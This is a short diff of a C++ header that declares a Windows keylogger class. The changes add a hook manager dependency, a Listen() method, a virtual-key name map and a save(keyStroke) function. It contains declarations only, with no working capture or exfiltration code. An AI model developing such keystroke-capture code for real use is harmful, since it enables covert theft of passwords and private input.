@@ -1,8 +1,12 @@
 #ifndef KEYLOGGER_H
-
 #define KEYLOGGER_H
 
 #include <os_manager.h>
+#include <hook_manager.h>
+#include <Windows.h>
+#include <sstream>
+#include <fstream>
+#include <map>
 
 enum LoggingFormat
 {
@@ -13,14 +17,19 @@ enum LoggingFormat
 
 class Keylogger {
 public:
-    Keylogger(LoggingFormat loggingFormat, OSManager manager, bool mouseIgnore);
+    Keylogger(OSManager& manager, HookManager& hookManager);
 
-    void start();
+    void Listen();
 
 private:
-    const LoggingFormat LOGGING_FORMAT;
-    const OSManager manager_;
-    const bool MOUSE_IGNORE;
+    std::map<int, std::string> _VIRTUAL_KEY_NAME;
+    const LoggingFormat _LOGGING_FORMAT;
+    const bool _MOUSE_IGNORE;
+    
+    HookManager _hookManager;
+    OSManager _manager;
+
+    int save(int keyStroke); 
 };
 
 #endif
